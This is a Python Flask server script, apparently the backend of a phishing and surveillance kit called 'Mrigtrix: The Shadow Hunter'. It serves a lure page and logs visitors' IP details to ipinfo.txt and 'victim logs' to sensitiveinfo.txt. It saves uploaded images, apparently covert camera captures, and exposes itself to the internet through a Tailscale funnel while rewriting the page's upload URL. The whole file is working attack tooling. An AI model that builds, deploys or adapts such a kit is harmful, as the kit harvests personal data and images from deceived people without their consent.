from flask import Flask, request, jsonify, Response
from colorama import Fore, Style, init
from werkzeug.utils import secure_filename
import os
import time
import logging
import subprocess
import shutil
import sys
import re

# Setup
IMAGE_DIR = 'image'
if not os.path.exists(IMAGE_DIR):
    os.makedirs(IMAGE_DIR)

app = Flask(__name__)

# Silence Flask logs
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


# Initialize Colorama
init(autoreset=True)

def show_banner():
    print(Fore.MAGENTA + Style.BRIGHT + r"""

███╗   ███╗██████╗ ██╗ ██████╗████████╗██████╗ ██╗██╗  ██╗    
████╗ ████║██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗██║╚██╗██╔╝    
██╔████╔██║██████╔╝██║██║  ███╗  ██║   ██████╔╝██║ ╚███╔╝     
██║╚██╔╝██║██╔══██╗██║██║   ██║  ██║   ██╔══██╗██║ ██╔██╗     
██║ ╚═╝ ██║██║  ██║██║╚██████╔╝  ██║   ██║  ██║██║██╔╝ ██╗    
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝      
""" + Style.RESET_ALL)

    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "        🔥 Mrigtrix: The Shadow Hunter 𓃰 — Now with Tailscale Access 🔐")
    print(Fore.RED + Style.DIM + "    [!] Warning: Unauthorized access to this system is strictly prohibited.\n" + Style.RESET_ALL)


@app.route('/')
def index():
    return Response(open('index.html').read(), mimetype="text/html")

@app.route('/ipinfo', methods=['POST'])
def ipinfos():
    iplogs = request.get_json()
    with open('ipinfo.txt', 'a') as f:
        f.write(f"\n{iplogs}\n")
    print(Fore.MAGENTA + "----------------------------------------------------")
    print(Fore.RED + "IP Logs saved to **ipinfo.txt**")
    print(Fore.MAGENTA + "----------------------------------------------------" + Style.RESET_ALL)
    return jsonify({'processed': 'true'})

@app.route('/process_qtc', methods=['POST'])
def getvictimlogs():
    logs = request.get_json()
    with open('sensitiveinfo.txt', 'a') as f:
        f.write(f"\n{logs}\n")
    print(Fore.MAGENTA + "----------------------------------------------------")
    print(Fore.RED + "Victim Logs saved to **sensitiveinfo.txt**")
    print(Fore.MAGENTA + "----------------------------------------------------" + Style.RESET_ALL)
    return jsonify({'processed': 'true'})

@app.route('/image', methods=['POST'])
def image():
    if 'image' not in request.files:
        return Response("No image part in the request", status=400)
    
    file = request.files['image']
    if file.filename == '':
        return Response("No selected file", status=400)

    if file:
        filename = f"{time.strftime('%Y%m%d-%H%M%S')}_{secure_filename(file.filename)}"
        full_path = os.path.join(IMAGE_DIR, filename)
        file.save(full_path)
        print(Fore.YELLOW + f"Image saved successfully at {full_path}" + Style.RESET_ALL)
        return Response(f"{filename} saved", status=200)
    else:
        return Response("Invalid file", status=400)

def check_tailscale():
    print("[+] Checking if Tailscale is installed...")
    if shutil.which("tailscale") is None:
        print("[!] Tailscale is not installed.")
        choice = input("Do you want to install Tailscale now? (y/n): ").strip().lower()
        if choice == 'y':
            subprocess.run(['curl', '-fsSL', 'https://tailscale.com/install.sh', '-o', 'install_tailscale.sh'], check=True)
            subprocess.run(['sudo', 'bash', 'install_tailscale.sh'], check=True)
            print("[+] Tailscale installed.")
        else:
            print("[!] Tailscale not installed. Exiting.")
            return False
    else:
        print("[+] Tailscale is already installed.")
    print("\n[+] To authenticate Tailscale, open this URL in your browser:")
    print("    https://login.tailscale.com")
    print("\n[+] Then run this command:")
    print("    sudo tailscale up")
    input("[*] Press Enter after authentication to continue...")
    return True

def update_index_html_with_url(url, index_file_path='index.html'):
    try:
        url = url.rstrip('/')
        with open(index_file_path, 'r') as file:
            content = file.read()

        new_content = re.sub(
            r"(xhr\.open\(\s*'POST',\s*')[^']+('\s*,\s*true\s*\);)",
            rf"\1{url}/image\2",
            content
        )

        with open(index_file_path, 'w') as file:
            file.write(new_content)

        print(f"[+] Updated {index_file_path} with correct Tailscale URL.")
    except Exception as e:
        print(f"[!] Failed to update {index_file_path}: {e}")


def start_tailscale_funnel(port):
    print(f"[~] Starting Tailscale funnel on port {port}...")
    proc = subprocess.Popen(['sudo', 'tailscale', 'funnel', str(port)],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True)
    funnel_url = None
    for _ in range(10):
        line = proc.stdout.readline()
        if not line:
            time.sleep(1)
            continue
        print(line.strip())
        if 'https://' in line and '.ts.net' in line:
            funnel_url = line.strip()
            break

    if funnel_url:
        print(f"\n[*] Tailscale Funnel URL: {funnel_url}")
        update_index_html_with_url(funnel_url)
    else:
        print("[!] Funnel URL not detected.")

    return proc

if __name__ == "__main__":
    show_banner()
    try:
        user_port = input("Enter the port you want to run the Flask app on (default 8080): ").strip()
        port = int(user_port) if user_port else 8080
    except ValueError:
        print("[!] Invalid port number. Using default port 8080.")
        port = 8080

    if not check_tailscale():
        sys.exit(1)

    funnel_proc = start_tailscale_funnel(port)

    try:
        app.run(debug=False, host='0.0.0.0', port=port)
    except KeyboardInterrupt:
        print("\n[!] Interrupt received. Shutting down Tailscale funnel...")
        funnel_proc.terminate()
        sys.exit(0)
